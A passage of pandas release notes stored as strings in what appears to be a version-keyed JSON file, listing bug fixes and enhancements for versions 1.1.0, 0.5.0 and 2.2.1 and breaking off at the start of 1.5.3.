(:issue:`33573`)\n- Bug in :meth:`Series.__setitem__` with an :class:`IntervalIndex` and a list-like key of integers (:issue:`33473`)\n- Bug in :meth:`Series.__getitem__` allowing missing labels with ``np.ndarray``, :class:`Index`, :class:`Series` indexers but not ``list``, these now all raise ``KeyError`` (:issue:`33646`)\n- Bug in :meth:`DataFrame.truncate` and :meth:`Series.truncate` where index was assumed to be monotone increasing (:issue:`33756`)\n- Indexing with a list of strings representing datetimes failed on :class:`DatetimeIndex` or :class:`PeriodIndex` (:issue:`11278`)\n- Bug in :meth:`Series.at` when used with a :class:`MultiIndex` would raise an exception on valid inputs (:issue:`26989`)\n- Bug in :meth:`DataFrame.loc` with dictionary of values changes columns with dtype of ``int`` to ``float`` (:issue:`34573`)\n- Bug in :meth:`Series.loc` when used with a :class:`MultiIndex` would raise an ``IndexingError`` when accessing a ``None`` value (:issue:`34318`)\n- Bug in :meth:`DataFrame.reset_index` and :meth:`Series.reset_index` would not preserve data types on an empty :class:`DataFrame` or :class:`Series` with a :class:`MultiIndex` (:issue:`19602`)\n- Bug in :class:`Series` and :class:`DataFrame` indexing with a ``time`` key on a :class:`DatetimeIndex` with ``NaT`` entries (:issue:`35114`)\n\nMissing\n^^^^^^^\n- Calling :meth:`fillna` on an empty :class:`Series` now correctly returns a shallow copied object. The behaviour is now consistent with :class:`Index`, :class:`DataFrame` and a non-empty :class:`Series` (:issue:`32543`).\n- Bug in :meth:`Series.replace` when argument ``to_replace`` is of type dict/list and is used on a :class:`Series` containing ``<NA>`` was raising a ``TypeError``. The method now handles this by ignoring ``<NA>`` values when doing the comparison for the replacement (:issue:`32621`)\n- Bug in :meth:`~Series.any` and :meth:`~Series.all` incorrectly returning ``<NA>`` for all ``False`` or all ``True`` values using the nulllable Boolean dtype and with ``skipna=False`` (:issue:`33253`)\n- Clarified documentation on interpolate with ``method=akima``. The ``der`` parameter must be scalar or ``None`` (:issue:`33426`)\n- :meth:`DataFrame.interpolate` uses the correct axis convention now. Previously interpolating along columns lead to interpolation along indices and vice versa. Furthermore interpolating with methods ``pad``, ``ffill``, ``bfill`` and ``backfill`` are identical to using these methods with :meth:`DataFrame.fillna` (:issue:`12918`, :issue:`29146`)\n- Bug in :meth:`DataFrame.interpolate` when called on a :class:`DataFrame` with column names of string type was throwing a ValueError. The method is now independent of the type of the column names (:issue:`33956`)\n- Passing :class:`NA` into a format string using format specs will now work. For example ``\"{:.1f}\".format(pd.NA)`` would previously raise a ``ValueError``, but will now return the string ``\"<NA>\"`` (:issue:`34740`)\n- Bug in :meth:`Series.map` not raising on invalid ``na_action`` (:issue:`32815`)\n\nMultiIndex\n^^^^^^^^^^\n\n- :meth:`DataFrame.swaplevels` now raises a ``TypeError`` if the axis is not a :class:`MultiIndex`. Previously an ``AttributeError`` was raised (:issue:`31126`)\n- Bug in :meth:`Dataframe.loc` when used with a :class:`MultiIndex`. The returned values were not in the same order as the given inputs (:issue:`22797`)\n\n.. ipython:: python\n\n        df = pd.DataFrame(np.arange(4),\n                          index=[[\"a\", \"a\", \"b\", \"b\"], [1, 2, 1, 2]])\n        # Rows are now ordered as the requested keys\n        df.loc[(['b', 'a'], [2, 1]), :]\n\n- Bug in :meth:`MultiIndex.intersection` was not guaranteed to preserve order when ``sort=False``. (:issue:`31325`)\n- Bug in :meth:`DataFrame.truncate` was dropping :class:`MultiIndex` names. (:issue:`34564`)\n\n.. ipython:: python\n\n        left = pd.MultiIndex.from_arrays([[\"b\", \"a\"], [2, 1]])\n        right = pd.MultiIndex.from_arrays([[\"a\", \"b\", \"c\"], [1, 2, 3]])\n        # Common elements are now guaranteed to be ordered by the left side\n        left.intersection(right, sort=False)\n\n- Bug when joining two :class:`MultiIndex` without specifying level with different columns. Return-indexers parameter was ignored. (:issue:`34074`)\n\nIO\n^^\n- Passing a ``set`` as ``names`` argument to :func:`pandas.read_csv`, :func:`pandas.read_table`, or :func:`pandas.read_fwf` will raise ``ValueError: Names should be an ordered collection.`` (:issue:`34946`)\n- Bug in print-out when ``display.precision`` is zero. (:issue:`20359`)\n- Bug in :func:`read_json` where integer overflow was occurring when json contains big number strings. (:issue:`30320`)\n- :func:`read_csv` will now raise a ``ValueError`` when the arguments ``header`` and ``prefix`` both are not ``None``. (:issue:`27394`)\n- Bug in :meth:`DataFrame.to_json` was raising ``NotFoundError`` when ``path_or_buf`` was an S3 URI (:issue:`28375`)\n- Bug in :meth:`DataFrame.to_parquet` overwriting pyarrow's default for\n  ``coerce_timestamps``; following pyarrow's default allows writing nanosecond\n  timestamps with ``version=\"2.0\"`` (:issue:`31652`).\n- Bug in :func:`read_csv` was raising ``TypeError`` when ``sep=None`` was used in combination with ``comment`` keyword (:issue:`31396`)\n- Bug in :class:`HDFStore` that caused it to set to ``int64`` the dtype of a ``datetime64`` column when reading a :class:`DataFrame` in Python 3 from fixed format written in Python 2 (:issue:`31750`)\n- :func:`read_sas()` now handles dates and datetimes larger than :attr:`Timestamp.max` returning them as :class:`datetime.datetime` objects (:issue:`20927`)\n- Bug in :meth:`DataFrame.to_json` where ``Timedelta`` objects would not be serialized correctly with ``date_format=\"iso\"`` (:issue:`28256`)\n- :func:`read_csv` will raise a ``ValueError`` when the column names passed in ``parse_dates`` are missing in the :class:`Dataframe` (:issue:`31251`)\n- Bug in :func:`read_excel` where a UTF-8 string with a high surrogate would cause a segmentation violation (:issue:`23809`)\n- Bug in :func:`read_csv` was causing a file descriptor leak on an empty file (:issue:`31488`)\n- Bug in :func:`read_csv` was causing a segfault when there were blank lines between the header and data rows (:issue:`28071`)\n- Bug in :func:`read_csv` was raising a misleading exception on a permissions issue (:issue:`23784`)\n- Bug in :func:`read_csv` was raising an ``IndexError`` when ``header=None`` and two extra data columns\n- Bug in :func:`read_sas` was raising an ``AttributeError`` when reading files from Google Cloud Storage (:issue:`33069`)\n- Bug in :meth:`DataFrame.to_sql` where an ``AttributeError`` was raised when saving an out of bounds date (:issue:`26761`)\n- Bug in :func:`read_excel` did not correctly handle multiple embedded spaces in OpenDocument text cells. (:issue:`32207`)\n- Bug in :func:`read_json` was raising ``TypeError`` when reading a ``list`` of Booleans into a :class:`Series`. (:issue:`31464`)\n- Bug in :func:`pandas.io.json.json_normalize` where location specified by ``record_path`` doesn't point to an array. (:issue:`26284`)\n- :func:`pandas.read_hdf` has a more explicit error message when loading an\n  unsupported HDF file (:issue:`9539`)\n- Bug in :meth:`~DataFrame.read_feather` was raising an ``ArrowIOError`` when reading an s3 or http file path (:issue:`29055`)\n- Bug in :meth:`~DataFrame.to_excel` could not handle the column name ``render`` and was raising an ``KeyError`` (:issue:`34331`)\n- Bug in :meth:`~SQLDatabase.execute` was raising a ``ProgrammingError`` for some DB-API drivers when the SQL statement contained the ``%`` character and no parameters were present (:issue:`34211`)\n- Bug in :meth:`~pandas.io.stata.StataReader` which resulted in categorical variables with different dtypes when reading data using an iterator. (:issue:`31544`)\n- :meth:`HDFStore.keys` has now an optional ``include`` parameter that allows the retrieval of all native HDF5 table names (:issue:`29916`)\n- ``TypeError`` exceptions raised by :func:`read_csv` and :func:`read_table` were showing as ``parser_f`` when an unexpected keyword argument was passed (:issue:`25648`)\n- Bug in :func:`read_excel` for ODS files removes 0.0 values (:issue:`27222`)\n- Bug in :func:`ujson.encode` was raising an ``OverflowError`` with numbers larger than ``sys.maxsize`` (:issue:`34395`)\n- Bug in :meth:`HDFStore.append_to_multiple` was raising a ``ValueError`` when the ``min_itemsize`` parameter is set (:issue:`11238`)\n- Bug in :meth:`~HDFStore.create_table` now raises an error when ``column`` argument was not specified in ``data_columns`` on input (:issue:`28156`)\n- :func:`read_json` now could read line-delimited json file from a file url while ``lines`` and ``chunksize`` are set.\n- Bug in :meth:`DataFrame.to_sql` when reading DataFrames with ``-np.inf`` entries with MySQL now has a more explicit ``ValueError`` (:issue:`34431`)\n- Bug where capitalised files extensions were not decompressed by read_* functions (:issue:`35164`)\n- Bug in :meth:`read_excel` that was raising a ``TypeError`` when ``header=None`` and ``index_col`` is given as a ``list`` (:issue:`31783`)\n- Bug in :func:`read_excel` where datetime values are used in the header in a :class:`MultiIndex` (:issue:`34748`)\n- :func:`read_excel` no longer takes ``**kwds`` arguments. This means that passing in the keyword argument ``chunksize`` now raises a ``TypeError`` (previously raised a ``NotImplementedError``), while passing in the keyword argument ``encoding`` now raises a ``TypeError`` (:issue:`34464`)\n- Bug in :meth:`DataFrame.to_records` was incorrectly losing timezone information in timezone-aware ``datetime64`` columns (:issue:`32535`)\n\nPlotting\n^^^^^^^^\n\n- :meth:`DataFrame.plot` for line/bar now accepts color by dictionary (:issue:`8193`).\n- Bug in :meth:`DataFrame.plot.hist` where weights are not working for multiple columns (:issue:`33173`)\n- Bug in :meth:`DataFrame.boxplot` and :meth:`DataFrame.plot.boxplot` lost color attributes of ``medianprops``, ``whiskerprops``, ``capprops`` and ``boxprops`` (:issue:`30346`)\n- Bug in :meth:`DataFrame.hist` where the order of ``column`` argument was ignored (:issue:`29235`)\n- Bug in :meth:`DataFrame.plot.scatter` that when adding multiple plots with different ``cmap``, colorbars always use the first ``cmap`` (:issue:`33389`)\n- Bug in :meth:`DataFrame.plot.scatter` was adding a colorbar to the plot even if the argument ``c`` was assigned to a column containing color names (:issue:`34316`)\n- Bug in :meth:`pandas.plotting.bootstrap_plot` was causing cluttered axes and overlapping labels (:issue:`34905`)\n- Bug in :meth:`DataFrame.plot.scatter` caused an error when plotting variable marker sizes (:issue:`32904`)\n\nGroupBy/resample/rolling\n^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Using a :class:`pandas.api.indexers.BaseIndexer` with ``count``, ``min``, ``max``, ``median``, ``skew``,  ``cov``, ``corr`` will now return correct results for any monotonic :class:`pandas.api.indexers.BaseIndexer` descendant (:issue:`32865`)\n- :meth:`DataFrameGroupby.mean` and :meth:`SeriesGroupby.mean` (and similarly for :meth:`~DataFrameGroupby.median`, :meth:`~DataFrameGroupby.std` and :meth:`~DataFrameGroupby.var`) now raise a ``TypeError`` if a non-accepted keyword argument is passed into it. Previously an ``UnsupportedFunctionCall`` was raised (``AssertionError`` if ``min_count`` passed into :meth:`~DataFrameGroupby.median`) (:issue:`31485`)\n- Bug in :meth:`.DataFrameGroupBy.apply` and :meth:`.SeriesGroupBy.apply` raising ``ValueError`` when the ``by`` axis is not sorted, has duplicates, and the applied ``func`` does not mutate passed in objects (:issue:`30667`)\n- Bug in :meth:`DataFrameGroupBy.transform` produces an incorrect result with transformation functions (:issue:`30918`)\n- Bug in :meth:`.DataFrameGroupBy.transform` and :meth:`.SeriesGroupBy.transform` were returning the wrong result when grouping by multiple keys of which some were categorical and others not (:issue:`32494`)\n- Bug in :meth:`.DataFrameGroupBy.count` and :meth:`.SeriesGroupBy.count` causing segmentation fault when grouped-by columns contain NaNs (:issue:`32841`)\n- Bug in :meth:`DataFrame.groupby` and :meth:`Series.groupby` produces inconsistent type when aggregating Boolean :class:`Series` (:issue:`32894`)\n- Bug in :meth:`DataFrameGroupBy.sum` and :meth:`SeriesGroupBy.sum` where a large negative number would be returned when the number of non-null values was below ``min_count`` for nullable integer dtypes (:issue:`32861`)\n- Bug in :meth:`SeriesGroupBy.quantile` was raising on nullable integers (:issue:`33136`)\n- Bug in :meth:`DataFrame.resample` where an ``AmbiguousTimeError`` would be raised when the resulting timezone aware :class:`DatetimeIndex` had a DST transition at midnight (:issue:`25758`)\n- Bug in :meth:`DataFrame.groupby` where a ``ValueError`` would be raised when grouping by a categorical column with read-only categories and ``sort=False`` (:issue:`33410`)\n- Bug in :meth:`.DataFrameGroupBy.agg`, :meth:`.SeriesGroupBy.agg`, :meth:`.DataFrameGroupBy.transform`, :meth:`.SeriesGroupBy.transform`, :meth:`.DataFrameGroupBy.resample`, and :meth:`.SeriesGroupBy.resample` where subclasses are not preserved (:issue:`28330`)\n- Bug in :meth:`SeriesGroupBy.agg` where any column name was accepted in the named aggregation of :class:`SeriesGroupBy` previously. The behaviour now allows only ``str`` and callables else would raise ``TypeError``. (:issue:`34422`)\n- Bug in :meth:`DataFrame.groupby` lost the name of the :class:`Index` when one of the ``agg`` keys referenced an empty list (:issue:`32580`)\n- Bug in :meth:`Rolling.apply` where ``center=True`` was ignored when ``engine='numba'`` was specified (:issue:`34784`)\n- Bug in :meth:`DataFrame.ewm.cov` was throwing ``AssertionError`` for :class:`MultiIndex` inputs (:issue:`34440`)\n- Bug in :meth:`core.groupby.DataFrameGroupBy.quantile` raised ``TypeError`` for non-numeric types rather than dropping the columns (:issue:`27892`)\n- Bug in :meth:`core.groupby.DataFrameGroupBy.transform` when ``func='nunique'`` and columns are of type ``datetime64``, the result would also be of type ``datetime64`` instead of ``int64`` (:issue:`35109`)\n- Bug in :meth:`DataFrame.groupby` raising an ``AttributeError`` when selecting a column and aggregating with ``as_index=False`` (:issue:`35246`).\n- Bug in :meth:`DataFrameGroupBy.first` and :meth:`DataFrameGroupBy.last` that would raise an unnecessary ``ValueError`` when grouping on multiple ``Categoricals`` (:issue:`34951`)\n\nReshaping\n^^^^^^^^^\n\n- Bug effecting all numeric and Boolean reduction methods not returning subclassed data type. (:issue:`25596`)\n- Bug in :meth:`DataFrame.pivot_table` when only :class:`MultiIndexed` columns is set (:issue:`17038`)\n- Bug in :meth:`DataFrame.unstack` and :meth:`Series.unstack` can take tuple names in :class:`MultiIndexed` data (:issue:`19966`)\n- Bug in :meth:`DataFrame.pivot_table` when ``margin`` is ``True`` and only ``column`` is defined (:issue:`31016`)\n- Fixed incorrect error message in :meth:`DataFrame.pivot` when ``columns`` is set to ``None``. (:issue:`30924`)\n- Bug in :func:`crosstab` when inputs are two :class:`Series` and have tuple names, the output will keep a dummy :class:`MultiIndex` as columns. (:issue:`18321`)\n- :meth:`DataFrame.pivot` can now take lists for ``index`` and ``columns`` arguments (:issue:`21425`)\n- Bug in :func:`concat` where the resulting indices are not copied when ``copy=True`` (:issue:`29879`)\n- Bug in :meth:`SeriesGroupBy.aggregate` was resulting in aggregations being overwritten when they shared the same name (:issue:`30880`)\n- Bug where :meth:`Index.astype` would lose the :attr:`name` attribute when converting from ``Float64Index`` to ``Int64Index``, or when casting to an ``ExtensionArray`` dtype (:issue:`32013`)\n- :meth:`Series.append` will now raise a ``TypeError`` when passed a :class:`DataFrame` or a sequence containing :class:`DataFrame` (:issue:`31413`)\n- :meth:`DataFrame.replace` and :meth:`Series.replace` will raise a ``TypeError`` if ``to_replace`` is not an expected type. Previously the ``replace`` would fail silently (:issue:`18634`)\n- Bug on inplace operation of a :class:`Series` that was adding a column to the :class:`DataFrame` from where it was originally dropped from (using ``inplace=True``) (:issue:`30484`)\n- Bug in :meth:`DataFrame.apply` where callback was called with :class:`Series` parameter even though ``raw=True`` requested. (:issue:`32423`)\n- Bug in :meth:`DataFrame.pivot_table` losing timezone information when creating a :class:`MultiIndex` level from a column with timezone-aware dtype (:issue:`32558`)\n- Bug in :func:`concat` where when passing a non-dict mapping as ``objs`` would raise a ``TypeError`` (:issue:`32863`)\n- :meth:`DataFrame.agg` now provides more descriptive ``SpecificationError`` message when attempting to aggregate a non-existent column (:issue:`32755`)\n- Bug in :meth:`DataFrame.unstack` when :class:`MultiIndex` columns and :class:`MultiIndex` rows were used (:issue:`32624`, :issue:`24729` and :issue:`28306`)\n- Appending a dictionary to a :class:`DataFrame` without passing ``ignore_index=True`` will raise ``TypeError: Can only append a dict if ignore_index=True`` instead of ``TypeError: Can only append a :class:`Series` if ignore_index=True or if the :class:`Series` has a name`` (:issue:`30871`)\n- Bug in :meth:`DataFrame.corrwith()`, :meth:`DataFrame.memory_usage()`, :meth:`DataFrame.dot()`,\n  :meth:`DataFrame.idxmin()`, :meth:`DataFrame.idxmax()`, :meth:`DataFrame.duplicated()`, :meth:`DataFrame.isin()`,\n  :meth:`DataFrame.count()`, :meth:`Series.explode()`, :meth:`Series.asof()` and :meth:`DataFrame.asof()` not\n  returning subclassed types. (:issue:`31331`)\n- Bug in :func:`concat` was not allowing for concatenation of :class:`DataFrame` and :class:`Series` with duplicate keys (:issue:`33654`)\n- Bug in :func:`cut` raised an error when the argument ``labels`` contains duplicates (:issue:`33141`)\n- Ensure only named functions can be used in :func:`eval()` (:issue:`32460`)\n- Bug in :meth:`Dataframe.aggregate` and :meth:`Series.aggregate` was causing a recursive loop in some cases (:issue:`34224`)\n- Fixed bug in :func:`melt` where melting :class:`MultiIndex` columns with ``col_level > 0`` would raise a ``KeyError`` on ``id_vars`` (:issue:`34129`)\n- Bug in :meth:`Series.where` with an empty :class:`Series` and empty ``cond`` having non-bool dtype (:issue:`34592`)\n- Fixed regression where :meth:`DataFrame.apply` would raise ``ValueError`` for elements with ``S`` dtype (:issue:`34529`)\n\nSparse\n^^^^^^\n- Creating a :class:`SparseArray` from timezone-aware dtype will issue a warning before dropping timezone information, instead of doing so silently (:issue:`32501`)\n- Bug in :meth:`arrays.SparseArray.from_spmatrix` wrongly read scipy sparse matrix (:issue:`31991`)\n- Bug in :meth:`Series.sum` with ``SparseArray`` raised a ``TypeError`` (:issue:`25777`)\n- Bug where :class:`DataFrame` containing an all-sparse :class:`SparseArray` filled with ``NaN`` when indexed by a list-like (:issue:`27781`, :issue:`29563`)\n- The repr of :class:`SparseDtype` now includes the repr of its ``fill_value`` attribute. Previously it used ``fill_value``'s  string representation (:issue:`34352`)\n- Bug where empty :class:`DataFrame` could not be cast to :class:`SparseDtype` (:issue:`33113`)\n- Bug in :meth:`arrays.SparseArray` was returning the incorrect type when indexing a sparse dataframe with an iterable (:issue:`34526`, :issue:`34540`)\n\nExtensionArray\n^^^^^^^^^^^^^^\n\n- Fixed bug where :meth:`Series.value_counts` would raise on empty input of ``Int64`` dtype (:issue:`33317`)\n- Fixed bug in :func:`concat` when concatenating :class:`DataFrame` objects with non-overlapping columns resulting in object-dtype columns rather than preserving the extension dtype (:issue:`27692`, :issue:`33027`)\n- Fixed bug where :meth:`StringArray.isna` would return ``False`` for NA values when ``pandas.options.mode.use_inf_as_na`` was set to ``True`` (:issue:`33655`)\n- Fixed bug in :class:`Series` construction with EA dtype and index but no data or scalar data fails (:issue:`26469`)\n- Fixed bug that caused :meth:`Series.__repr__()` to crash for extension types whose elements are multidimensional arrays (:issue:`33770`).\n- Fixed bug where :meth:`Series.update` would raise a ``ValueError`` for ``ExtensionArray`` dtypes with missing values (:issue:`33980`)\n- Fixed bug where :meth:`StringArray.memory_usage` was not implemented (:issue:`33963`)\n- Fixed bug where :meth:`DataFrameGroupBy` would ignore the ``min_count`` argument for aggregations on nullable Boolean dtypes (:issue:`34051`)\n- Fixed bug where the constructor of :class:`DataFrame` with ``dtype='string'`` would fail (:issue:`27953`, :issue:`33623`)\n- Bug where :class:`DataFrame` column set to scalar extension type was considered an object type rather than the extension type (:issue:`34832`)\n- Fixed bug in :meth:`IntegerArray.astype` to correctly copy the mask as well (:issue:`34931`).\n\nOther\n^^^^^\n\n- Set operations on an object-dtype :class:`Index` now always return object-dtype results (:issue:`31401`)\n- Fixed :func:`pandas.testing.assert_series_equal` to correctly raise if the ``left`` argument is a different subclass with ``check_series_type=True`` (:issue:`32670`).\n- Getting a missing attribute in a :meth:`DataFrame.query` or :meth:`DataFrame.eval` string raises the correct ``AttributeError`` (:issue:`32408`)\n- Fixed bug in :func:`pandas.testing.assert_series_equal` where dtypes were checked for ``Interval`` and ``ExtensionArray`` operands when ``check_dtype`` was ``False`` (:issue:`32747`)\n- Bug in :meth:`DataFrame.__dir__` caused a segfault when using unicode surrogates in a column name (:issue:`25509`)\n- Bug in :meth:`DataFrame.equals` and :meth:`Series.equals` in allowing subclasses to be equal (:issue:`34402`).\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_110.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.0.5..v1.1.0|HEAD\n", "0.5.0": "\n.. _whatsnew_050:\n\nVersion 0.5.0 (October 24, 2011)\n--------------------------------\n\n{{ header }}\n\nNew features\n~~~~~~~~~~~~\n\n- :ref:`Added <basics.df_join>` ``DataFrame.align`` method with standard join options\n- :ref:`Added <io.parse_dates>` ``parse_dates`` option to ``read_csv`` and ``read_table`` methods to optionally try to parse dates in the index columns\n- :ref:`Added <io.parse_dates>` ``nrows``, ``chunksize``, and ``iterator`` arguments to ``read_csv`` and ``read_table``. The last two return a new ``TextParser`` class capable of lazily iterating through chunks of a flat file (:issue:`242`)\n- :ref:`Added <merging.multikey_join>` ability to join on multiple columns in ``DataFrame.join`` (:issue:`214`)\n- Added private ``_get_duplicates`` function to ``Index`` for identifying duplicate values more easily (ENH5c_)\n- :ref:`Added <indexing.df_cols>` column attribute access to DataFrame.\n- :ref:`Added <indexing.df_cols>` Python tab completion hook for DataFrame columns. (:issue:`233`, :issue:`230`)\n- :ref:`Implemented <basics.describe>` ``Series.describe`` for Series containing objects (:issue:`241`)\n- :ref:`Added <merging.df_inner_join>` inner join option to ``DataFrame.join`` when joining on key(s) (:issue:`248`)\n- :ref:`Implemented <indexing.df_cols>` selecting DataFrame columns by passing a list to ``__getitem__`` (:issue:`253`)\n- :ref:`Implemented <indexing.set_ops>` & and | to intersect / union Index objects, respectively (:issue:`261`)\n- :ref:`Added<reshaping.pivot>` ``pivot_table`` convenience function to pandas namespace (:issue:`234`)\n- :ref:`Implemented <basics.rename_axis>` ``Panel.rename_axis`` function (:issue:`243`)\n- DataFrame will show index level names in console output (:issue:`334`)\n- :ref:`Implemented <advanced.take>` ``Panel.take``\n- :ref:`Added<basics.console_output>` ``set_eng_float_format`` for alternate DataFrame floating point string formatting (ENH61_)\n- :ref:`Added <indexing.set_index>` convenience ``set_index`` function for creating a DataFrame index from its existing columns\n- :ref:`Implemented <groupby.multiindex>` ``groupby`` hierarchical index level name  (:issue:`223`)\n- :ref:`Added <io.store_in_csv>` support for different delimiters in ``DataFrame.to_csv`` (:issue:`244`)\n\nPerformance enhancements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n- VBENCH Major performance improvements in file parsing functions ``read_csv`` and ``read_table``\n- VBENCH Added Cython function for converting tuples to ndarray very fast. Speeds up many MultiIndex-related operations\n- VBENCH Refactored merging / joining code into a tidy class and disabled unnecessary computations in the float/object case, thus getting about 10% better performance (:issue:`211`)\n- VBENCH Improved speed of ``DataFrame.xs`` on mixed-type DataFrame objects by about 5x, regression from 0.3.0 (:issue:`215`)\n- VBENCH With new ``DataFrame.align`` method, speeding up binary operations between differently-indexed DataFrame objects by 10-25%.\n- VBENCH Significantly sped up conversion of nested dict into DataFrame (:issue:`212`)\n- VBENCH Significantly speed up DataFrame ``__repr__`` and ``count`` on large mixed-type DataFrame objects\n\n.. _ENH61: https://github.com/pandas-dev/pandas/commit/6141961\n.. _ENH5c: https://github.com/pandas-dev/pandas/commit/5ca6ff5d822ee4ddef1ec0d87b6d83d8b4bbd3eb\n\n\n.. _whatsnew_0.5.0.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.4.0..v0.5.0\n", "2.2.1": ".. _whatsnew_221:\n\nWhat's new in 2.2.1 (February 22, 2024)\n---------------------------------------\n\nThese are the changes in pandas 2.2.1. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_221.enhancements:\n\nEnhancements\n~~~~~~~~~~~~\n- Added ``pyarrow`` pip extra so users can install pandas and pyarrow with pip with ``pip install pandas[pyarrow]`` (:issue:`54466`)\n\n.. _whatsnew_221.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed memory leak in :func:`read_csv` (:issue:`57039`)\n- Fixed performance regression in :meth:`Series.combine_first` (:issue:`55845`)\n- Fixed regression causing overflow for near-minimum timestamps (:issue:`57150`)\n- Fixed regression in :func:`concat` changing long-standing behavior that always sorted the non-concatenation axis when the axis was a :class:`DatetimeIndex` (:issue:`57006`)\n- Fixed regression in :func:`merge_ordered` raising ``TypeError`` for ``fill_method=\"ffill\"`` and ``how=\"left\"`` (:issue:`57010`)\n- Fixed regression in :func:`pandas.testing.assert_series_equal` defaulting to ``check_exact=True`` when checking the :class:`Index` (:issue:`57067`)\n- Fixed regression in :func:`read_json` where an :class:`Index` would be returned instead of a :class:`RangeIndex` (:issue:`57429`)\n- Fixed regression in :func:`wide_to_long` raising an ``AttributeError`` for string columns (:issue:`57066`)\n- Fixed regression in :meth:`.DataFrameGroupBy.idxmin`, :meth:`.DataFrameGroupBy.idxmax`, :meth:`.SeriesGroupBy.idxmin`, :meth:`.SeriesGroupBy.idxmax` ignoring the ``skipna`` argument (:issue:`57040`)\n- Fixed regression in :meth:`.DataFrameGroupBy.idxmin`, :meth:`.DataFrameGroupBy.idxmax`, :meth:`.SeriesGroupBy.idxmin`, :meth:`.SeriesGroupBy.idxmax` where values containing the minimum or maximum value for the dtype could produce incorrect results (:issue:`57040`)\n- Fixed regression in :meth:`CategoricalIndex.difference` raising ``KeyError`` when other contains null values other than NaN (:issue:`57318`)\n- Fixed regression in :meth:`DataFrame.groupby` raising ``ValueError`` when grouping by a :class:`Series` in some cases (:issue:`57276`)\n- Fixed regression in :meth:`DataFrame.loc` raising ``IndexError`` for non-unique, masked dtype indexes where result has more than 10,000 rows (:issue:`57027`)\n- Fixed regression in :meth:`DataFrame.loc` which was unnecessarily throwing \"incompatible dtype warning\" when expanding with partial row indexer and multiple columns (see `PDEP6 <https://pandas.pydata.org/pdeps/0006-ban-upcasting.html>`_) (:issue:`56503`)\n- Fixed regression in :meth:`DataFrame.map` with ``na_action=\"ignore\"`` not being respected for NumPy nullable and :class:`ArrowDtypes` (:issue:`57316`)\n- Fixed regression in :meth:`DataFrame.merge` raising ``ValueError`` for certain types of 3rd-party extension arrays (:issue:`57316`)\n- Fixed regression in :meth:`DataFrame.query` with all ``NaT`` column with object dtype (:issue:`57068`)\n- Fixed regression in :meth:`DataFrame.shift` raising ``AssertionError`` for ``axis=1`` and empty :class:`DataFrame` (:issue:`57301`)\n- Fixed regression in :meth:`DataFrame.sort_index` not producing a stable sort for a index with duplicates (:issue:`57151`)\n- Fixed regression in :meth:`DataFrame.to_dict` with ``orient='list'`` and datetime or timedelta types returning integers (:issue:`54824`)\n- Fixed regression in :meth:`DataFrame.to_json` converting nullable integers to floats (:issue:`57224`)\n- Fixed regression in :meth:`DataFrame.to_sql` when ``method=\"multi\"`` is passed and the dialect type is not Oracle (:issue:`57310`)\n- Fixed regression in :meth:`DataFrame.transpose` with nullable extension dtypes not having F-contiguous data potentially causing exceptions when used (:issue:`57315`)\n- Fixed regression in :meth:`DataFrame.update` emitting incorrect warnings about downcasting (:issue:`57124`)\n- Fixed regression in :meth:`DataFrameGroupBy.idxmin`, :meth:`DataFrameGroupBy.idxmax`, :meth:`SeriesGroupBy.idxmin`, :meth:`SeriesGroupBy.idxmax` ignoring the ``skipna`` argument (:issue:`57040`)\n- Fixed regression in :meth:`DataFrameGroupBy.idxmin`, :meth:`DataFrameGroupBy.idxmax`, :meth:`SeriesGroupBy.idxmin`, :meth:`SeriesGroupBy.idxmax` where values containing the minimum or maximum value for the dtype could produce incorrect results (:issue:`57040`)\n- Fixed regression in :meth:`ExtensionArray.to_numpy` raising for non-numeric masked dtypes (:issue:`56991`)\n- Fixed regression in :meth:`Index.join` raising ``TypeError`` when joining an empty index to a non-empty index containing mixed dtype values (:issue:`57048`)\n- Fixed regression in :meth:`Series.astype` introducing decimals when converting from integer with missing values to string dtype (:issue:`57418`)\n- Fixed regression in :meth:`Series.pct_change` raising a ``ValueError`` for an empty :class:`Series` (:issue:`57056`)\n- Fixed regression in :meth:`Series.to_numpy` when dtype is given as float and the data contains NaNs (:issue:`57121`)\n- Fixed regression in addition or subtraction of :class:`DateOffset` objects with millisecond components to ``datetime64`` :class:`Index`, :class:`Series`, or :class:`DataFrame` (:issue:`57529`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_221.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Fixed bug in :func:`pandas.api.interchange.from_dataframe` which was raising for Nullable integers (:issue:`55069`)\n- Fixed bug in :func:`pandas.api.interchange.from_dataframe` which was raising for empty inputs (:issue:`56700`)\n- Fixed bug in :func:`pandas.api.interchange.from_dataframe` which wasn't converting columns names to strings (:issue:`55069`)\n- Fixed bug in :meth:`DataFrame.__getitem__` for empty :class:`DataFrame` with Copy-on-Write enabled (:issue:`57130`)\n- Fixed bug in :meth:`PeriodIndex.asfreq` which was silently converting frequencies which are not supported as period frequencies instead of raising an error (:issue:`56945`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_221.other:\n\nOther\n~~~~~\n\n.. note::\n\n    The ``DeprecationWarning`` that was raised when pandas was imported without PyArrow being\n    installed has been removed. This decision was made because the warning was too noisy for too\n    many users and a lot of feedback was collected about the decision to make PyArrow a required\n    dependency. Pandas is currently considering the decision whether or not PyArrow should be added\n    as a hard dependency in 3.0. Interested users can follow the discussion\n    `here <https://github.com/pandas-dev/pandas/issues/57073>`_.\n\n- Added the argument ``skipna`` to :meth:`DataFrameGroupBy.first`, :meth:`DataFrameGroupBy.last`, :meth:`SeriesGroupBy.first`, and :meth:`SeriesGroupBy.last`; achieving ``skipna=False`` used to be available via :meth:`DataFrameGroupBy.nth`, but the behavior was changed in pandas 2.0.0 (:issue:`57019`)\n- Added the argument ``skipna`` to :meth:`Resampler.first`, :meth:`Resampler.last` (:issue:`57019`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_221.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v2.2.0..v2.2.1\n", "1.5.3": ".. _whatsnew_153:\n\nWhat's new in 1.5.3 (January 18, 2023)\n--------------------------------------\n\nThese are the changes in pandas 1.5.3. See :ref:`release` for a full changelog\nincluding other versions of 